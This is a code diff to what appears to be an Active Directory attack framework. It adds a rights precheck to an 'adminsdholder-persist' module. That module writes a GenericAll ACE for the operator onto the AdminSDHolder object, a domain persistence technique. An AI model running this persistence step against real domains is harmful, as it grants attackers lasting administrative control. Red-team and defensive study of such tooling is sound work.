@@ -17,6 +17,7 @@ from adaf_attack.core.acl import (
     append_ace_to_sd,
     build_allowed_ace,
     fetch_sd,
+    parse_interesting_aces,
     sd_set_owner,
 )
 from adaf_attack.core.graph import AttackGraph
@@ -360,6 +361,32 @@ class AclAbuse:
             conn.unbind()
 
 
+_UNIVERSAL_SIDS = ("S-1-1-0", "S-1-5-32-544")
+_RIGHT_GRANTING_SIDS = {"GenericAll", "WriteDacl", "WriteOwner"}
+
+
+def _adminsdholder_rights_ok(sd_bytes: bytes | None, principal_sid: str) -> bool:
+    """Return True when the operator SID holds DACL-modifying rights on the SD.
+
+    Well-known universal SIDs (Everyone, BUILTIN\\Administrators) are honored
+    because membership cannot be resolved from the descriptor alone.
+    """
+    if not sd_bytes:
+        return False
+    try:
+        aces = parse_interesting_aces(sd_bytes)
+    except RuntimeError:
+        raise
+    except Exception:  # noqa: BLE001 - malformed SD should not crash the precheck
+        return False
+    for ace in aces:
+        if ace.principal_sid in _UNIVERSAL_SIDS and ace.right in _RIGHT_GRANTING_SIDS:
+            return True
+    return any(
+        ace.principal_sid == principal_sid and ace.right in _RIGHT_GRANTING_SIDS for ace in aces
+    )
+
+
 @register_from_catalog("adminsdholder-persist")
 class AdminSdHolderPersist:
     def run(
@@ -377,6 +404,21 @@ class AdminSdHolderPersist:
             holder = f"CN=AdminSDHolder,CN=System,{base_dn}"
             previous = fetch_sd(conn, holder)
             principal_sid = _operator_sid(conn, base_dn, target, kwargs)
+            precheck = _adminsdholder_rights_ok(previous, principal_sid)
+            if not precheck and not bool(kwargs.get("assume_rights")):
+                result = {
+                    "ok": False,
+                    "target": holder,
+                    "principal_sid": principal_sid,
+                    "error_note": (
+                        "Precondition failed: no WriteDacl/GenericAll ACE found for "
+                        f"{principal_sid} on AdminSDHolder. Effective Domain Admin (or "
+                        "equivalent) rights are required. Pass -P assume_rights=true to "
+                        "override this check."
+                    ),
+                }
+                console.print("[red]adminsdholder-persist[/red] precondition failed")
+                return finish(session, graph, "adminsdholder-persist", result, ok=False)
             ace = build_allowed_ace(principal_sid, mask=GENERIC_ALL)
             new_sd = append_ace_to_sd(previous, ace)
             ok = _write_sd(conn, session, holder, previous, new_sd)
